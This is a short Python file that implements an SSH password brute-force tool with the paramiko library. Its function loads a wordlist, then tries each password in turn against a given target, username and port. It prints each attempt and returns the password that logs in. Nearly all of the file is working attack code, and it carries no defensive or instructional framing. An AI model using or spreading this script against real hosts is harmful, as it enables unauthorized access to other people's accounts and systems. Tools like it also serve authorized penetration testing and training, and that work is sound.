import paramiko, os, threading
from itertools import product
from wordlist import create_wordlist
from concurrent.futures import ThreadPoolExecutor


# def create_wordlist(wordlist_path):

#     cwd = os.getcwd()

#     if wordlist_path[0] != "/":
#         wordlist_path = os.getcwd() + "/" + wordlist_path
#     elif wordlist_path[0] == "." and wordlist_path[1] == "/":
#         wordlist_path = os.getcwd() + wordlist_path[1:]
#     else:
#         wordlist_path = wordlist_path

#     wordlist = open(wordlist_path, "r")
#     wordlist = wordlist.readlines()
#     wordlist = [word.strip() for word in wordlist]
    
#     return wordlist



def brute_force_ssh(target, user, port, wordlist):

    wordlists = create_wordlist(wordlist)


    for word in wordlists:

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.WarningPolicy)

        try:
            print("Trying: " + word)
            ssh.connect(target, port=port,
                        username=user,
                        password=word,
                        look_for_keys=False,
                        banner_timeout=1,
                        timeout=1)
            
            ssh.close()
            output = f"Password found : '{word}'"
            return output

        except:
            
            ssh.close()
            continue
    
    return "Password not found in the wordlist"
